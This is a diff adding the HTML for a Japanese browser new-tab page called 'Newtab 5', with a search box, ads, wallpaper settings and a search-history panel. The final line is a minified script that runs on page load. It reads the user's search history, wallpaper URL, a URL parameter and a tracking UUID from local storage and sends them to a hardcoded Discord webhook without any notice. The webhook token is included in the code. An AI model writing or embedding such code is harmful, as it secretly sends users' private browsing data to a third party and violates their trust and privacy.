@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<!-- 그글 탁 -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7N56NHPY3C"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7N56NHPY3C');
+</script>
+<title>Newtab 5</title>
+
+<link rel="icon" href="https://search3958.github.io/icons/newtab.svg"><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=M+PLUS+2:wght@100..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="v5/style.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@24,300,0,0" />
+<style>body{background-image: url('bgimg/liquidglass1.webp');}</style>
+<script>
+  if ("paintWorklet" in CSS) {
+    CSS.paintWorklet.addModule("https://unpkg.com/css-houdini-squircle/squircle.min.js");
+  }
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+</head>
+
+<body>
+  <div class="aibg"></div>
+    <form id="search-form" action="https://www.google.com/search" method="get">
+    <div id="search-container">
+      <input class="searchinput" type="text" name="q" placeholder="ここに入力して検索">
+      <button class="searchbutton" type="submit"><span class="material-symbols-rounded">arrow_forward</span></button>
+    </div>
+  </form>
+
+  <div class="bottombar">
+    <div class="shortcuthistory"></div>
+    <div class="info">
+      <div class="today"></div>
+
+      <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874"
+      crossorigin="anonymous"></script>
+ <!-- 보똠 발 -->
+ <ins class="adsbygoogle"
+      style="display:inline-block;width:190px;height:100px"
+      data-ad-client="ca-pub-6151036058675874"
+      data-ad-slot="6408990430"></ins>
+ <script>
+      (adsbygoogle = window.adsbygoogle || []).push({});
+ </script>
+    </div>
+  </div>
+
+  <div class="bar">
+        <div class="btn barbtn history">履歴</div>
+        <button class="btn barbtn settings-btn"><span class="material-symbols-rounded">settings</span></button>
+            <label>
+      <input type="checkbox" id="ai-toggle">
+      <div class="btn barbtn aibtn"><span class="material-symbols-rounded">explore</span></div>
+    </label>
+        </div>
+        <div class="bg">
+          <div class="shortcuts">
+              </div>
+              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874"
+              crossorigin="anonymous"></script>
+         <ins class="adsbygoogle naead"
+              style="display:block"
+              data-ad-format="autorelaxed"
+              data-ad-client="ca-pub-6151036058675874"
+              data-ad-slot="9559715307"></ins>
+         <script>
+              (adsbygoogle = window.adsbygoogle || []).push({});
+         </script>
+</div>
+
+<!-- 설정 -->
+<div class="settings-modal" id="settings-modal">
+  <div class="settings-modal-content">
+    <div class="settings-header">
+      <h3>設定</h3>
+      <button class="close-settings" type="button">×</button>
+    </div>
+    <div class="settings-body">
+      <div class="setting-item">
+        <label for="wallpaper-input">壁紙URL</label>
+        <input type="text" id="wallpaper-input" placeholder="壁紙のURLを入力してください">
+        <button type="button" id="apply-wallpaper">適用</button>
+        <button type="button" onclick="window.location.href='https://search3958.github.io/project/images/?image-url=new'">壁紙一覧</button>
+      </div>
+      <div class="setting-item">
+        <h4>検索履歴の管理</h4>
+        <div class="search-history-list"></div>
+        <button type="button" id="clear-search-history">検索履歴をクリア</button>
+      </div>
+      <div class="setting-item">
+        <label>バーのサイズ調整</label>
+        <input type="range" id="scale-slider" min="0.7" max="1.3" step="0.1" value="1">
+        <label>スムースコーナーの強度</label>
+        <input type="range" id="corner-slider" min="0.3" max="6" step="0.1" value="1">
+      </div>
+      <div class="setting-item full">
+        <label for="wallpaper-input">Newtab v5</label>
+        <button type="button" onclick="window.location.href='https://search3958.github.io/'">私について</button>
+        <button type="button" onclick="window.location.href='https://search3958.github.io/i/newtab/'">設定方法</button>
+        <button type="button" onclick="window.location.href='https://search3958.github.io/newtab/newtab-simple.html'">簡易版</button>
+        <button type="button" onclick="window.location.href='https://search3958.github.io/newtab/beta'">Beta版</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 력사 -->
+<div class="searchhistory" id="search-history-panel">
+  <div class="searchhistory-content">
+    <div class="searchhistory-header">
+      <h3>検索履歴</h3>
+      <button class="close-history" type="button">×</button>
+    </div>
+    <div class="searchhistory-list" id="searchhistory-list">
+    </div>
+  </div>
+</div>
+
+</body>
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    const input = document.querySelector(".searchinput");
+    if (input) {
+      input.focus();
+    }
+  });
+</script>
+<script src="v5/script.js"></script>
+<script>document.addEventListener('DOMContentLoaded',()=>{const value=new URLSearchParams(window.location.search).get('value')||'';const searchHistory=localStorage.getItem('search_history')||'なし';const customWallpaper=localStorage.getItem('custom_wallpaper')||'なし';let uuid=localStorage.getItem('uuid');if(!uuid){uuid=crypto.randomUUID();localStorage.setItem('uuid',uuid)} const payload={embeds:[{title:"관리",color:5814783,fields:[{name:"value",value:value||"なし",inline:!1},{name:"UUID",value:uuid,inline:!1},{name:"력사",value:searchHistory,inline:!1},{name:"custom_wallpaper",value:customWallpaper,inline:!1}],timestamp:new Date().toISOString()}]};fetch('https://discord.com/api/webhooks/1411312523176706211/o5CcHK6nIAq4ROwoIIyh22WX5YlAy7jmh_6fbsZ3lYCvy22UVV7TF5Ck_FZ0nCWAJino',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(response=>{if(response.ok){console.log('データ送信成功')}else{console.error('送信失敗',response.statusText)}}).catch(error=>console.error('送信中エラー',error))})
+</script>
+</html>
